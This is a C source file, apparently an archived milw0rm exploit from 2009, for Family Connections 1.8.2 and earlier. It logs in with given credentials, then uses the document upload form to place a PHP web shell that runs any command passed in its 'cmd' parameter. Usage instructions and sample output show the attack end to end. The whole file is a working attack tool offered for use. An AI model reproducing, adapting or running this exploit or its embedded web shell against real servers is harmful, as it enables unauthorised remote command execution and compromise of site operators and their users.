@@ -1,0 +1,244 @@
+/*
+
+	Family Connections <= 1.8.2 - Remote Shell Upload Exploit
+	
+	Author: Salvatore "drosophila" Fresta
+	
+	Contact: drosophilaxxx@gmail.com
+	
+	Date: 3 April 2009
+
+	The following software will upload a simple php shell.
+	To execute remote commands, you must open the file 
+	using a browser.
+	
+	gcc rsue.c -o rsue
+	
+	./rsue localhost /fcms/ user password
+
+	[*] Connecting...
+	[+] Connected
+	[*] Send login...
+	[+] Login Successful
+	[+] Uploading...
+	[+] Shell uploaded
+	[+] Connection closed
+	
+	Open your browser and go to http://localhost/fcms/gallery/documents/shell.php?cmd=[commands]
+
+*/	
+
+#include <string.h>
+#include <stdlib.h>
+#include <stdio.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <unistd.h>
+#include <netdb.h>
+
+int socket_connect(char *server, int port) {
+
+	int fd;
+	struct sockaddr_in sock;
+	struct hostent *host;
+	
+	memset(&sock, 0, sizeof(sock));
+	
+	if((fd = socket(AF_INET, SOCK_STREAM, 0)) < 0) return -1;
+	
+	sock.sin_family = AF_INET;
+	sock.sin_port = htons(port);
+	
+	if(!(host=gethostbyname(server))) return -1;
+	
+	sock.sin_addr = *((struct in_addr *)host->h_addr);
+	
+	if(connect(fd, (struct sockaddr *) &sock, sizeof(sock)) < 0) return -1;
+	
+	return fd;
+   
+}
+
+int socket_send(int socket, char *buffer, size_t size) {
+	
+	if(socket < 0) return -1;
+
+	return write(socket, buffer, size) < 0 ? -1 : 0;
+	
+}
+
+char *socket_receive(int socket, int tout) {
+
+	fd_set input;
+	int ret, byte;
+	char *buffer, *tmp;
+	struct timeval timeout;
+	
+	FD_ZERO(&input);
+	FD_SET(socket, &input);
+	
+	if(tout > 0) {
+			timeout.tv_sec  = tout;
+			timeout.tv_usec = 0;
+	}
+	
+	if(socket < 0) return NULL;
+	
+	if(!(buffer = (char *) calloc (0, sizeof (char)))) return NULL;
+	
+	while (1) {
+	
+		if(tout > 0)
+			ret = select(socket + 1, &input, NULL, NULL, &timeout);
+	else
+			ret = select(socket + 1, &input, NULL, NULL, NULL);
+	
+	if (!ret) break;
+	if (ret < 0) return NULL;
+	
+	if(!(tmp = (char *) calloc (1024, sizeof (char)))) return NULL;
+	
+	if ((byte=read(socket, tmp, 1024)) < 0) return NULL;
+	
+		if(!byte) break;
+	
+	if(!(buffer = (char *) realloc(buffer, strlen (buffer) + strlen (tmp)))) return NULL;
+	
+	strncat(buffer, tmp, strlen(buffer)+strlen(tmp));
+	
+	}
+	
+	return buffer;
+   
+}
+
+void usage(char *bn) {
+
+	printf("\nFamily Connections <= 1.8.2 - Remote Shell Upload Exploit\n"
+			"Author: Salvatore \"drosophila\" Fresta\n\n"
+			"usage: %s <server> <path> <username> <password>\n"
+			"example: %s localhost /fcms/ admin 123456\n\n", bn, bn);	
+
+}
+
+int main(int argc, char *argv[]) {
+	
+	int sd;
+	char code[] = "--AaB03x\r\n"
+					"Content-Disposition: form-data; name=\"doc\"; filename=\"shell.php\"\r\n"
+					"Content-Type: text/plain\r\n"
+					"\r\n"
+					"<?php echo \"<pre>\"; system($_GET['cmd']); echo \"</pre>\"?>\r\n"
+					"--AaB03x\r\n"
+					"Content-Disposition: form-data; name=\"desc\"\r\n"
+					"\r\n"
+					"description\r\n"
+					"--AaB03x\r\n"
+					"Content-Disposition: form-data; name=\"submitadd\"\r\n"
+					"\r\n"
+					"Submit\r\n"
+					"--AaB03x--\r\n",
+		*buffer = NULL,
+		*rec = NULL,
+		*session = NULL;
+		
+	if(argc < 5) {
+		usage(argv[0]);
+		return -1;
+	}
+	
+	if(!(buffer = (char *)calloc(200+strlen(code)+strlen(argv[1])+strlen(argv[2])+strlen(argv[3])+strlen(argv[4]), sizeof(char)))) {
+		perror("calloc");
+		return -1;
+	}
+	
+	sprintf(buffer, "POST %sindex.php HTTP/1.1\r\n"
+					"Host: %s\r\n"
+					"Content-Type: application/x-www-form-urlencoded\r\n"
+					"Content-Length: %d\r\n\r\nuser=%s&pass=%s&submit=Login", argv[2], argv[1], (strlen(argv[4])+strlen(argv[3])+24), argv[3], argv[4]);
+	
+					
+	printf("\n[*] Connecting...");
+	
+	if((sd = socket_connect(argv[1], 80)) < 0) {
+		printf("[-] Connection failed!\n\n");
+		free(buffer);
+		return -1;
+	}
+	
+	printf("\n[+] Connected"
+			"\n[*] Send login...");
+	
+	if(socket_send(sd, buffer, strlen(buffer)) < 0) {
+		printf("[-] Sending failed!\n\n");
+		free(buffer);
+		close(sd);
+		return -1;
+	}
+	
+	if(!(rec = socket_receive(sd, 0))) {
+		printf("[-] Receive failed!\n\n");
+		free(buffer);
+		close(sd);
+		return -1;
+	}
+	
+	if(!strstr(rec, "Login Successful")) {
+		printf("\n[-] Login Incorrect!\n\n");
+		free(buffer);
+		close(sd);
+		return -1;
+	}
+	
+	session = strstr(rec, "PHPSESSID");
+	session = strtok(session, ";");
+	
+	if((sd = socket_connect(argv[1], 80)) < 0) {
+		printf("[-] Connection failed!\n\n");
+		free(buffer);
+		return -1;
+	}
+	
+	printf("\n[+] Login Successful"
+			"\n[+] Uploading...");
+	
+	sprintf(buffer, "POST %sdocuments.php HTTP/1.1\r\n"
+					"Host: %s\r\n"
+					"Cookie: %s\r\n"
+					"Content-type: multipart/form-data, boundary=AaB03x\r\n"
+					"Content-Length: %d\r\n\r\n%s", argv[2], argv[1], session, strlen(code), code);
+	
+	if(socket_send(sd, buffer, strlen(buffer)) < 0) {
+		printf("[-] Sending failed!\n\n");
+		free(buffer);
+		close(sd);
+		return -1;
+	}
+	
+	if(!(rec = socket_receive(sd, 0))) {
+		printf("[-] Receive failed!\n\n");
+		free(buffer);
+		close(sd);
+		return -1;
+	}
+	
+	if(!strstr(rec, "Uploaded Successfully")) {
+		printf("\n[-] Upload failed!\n\n");
+		free(buffer);
+		close(sd);
+		return -1;
+	}
+	
+	free(buffer);
+	close(sd);
+	
+	printf("\n[+] Shell uploaded"
+			"\n[+] Connection closed\n\n"
+			"Open your browser and go to http://%s%sgallery/documents/shell.php?cmd=[commands]\n\n", argv[1], argv[2]);
+	
+	return 0;
+	
+}
+
+// milw0rm.com [2009-04-03]
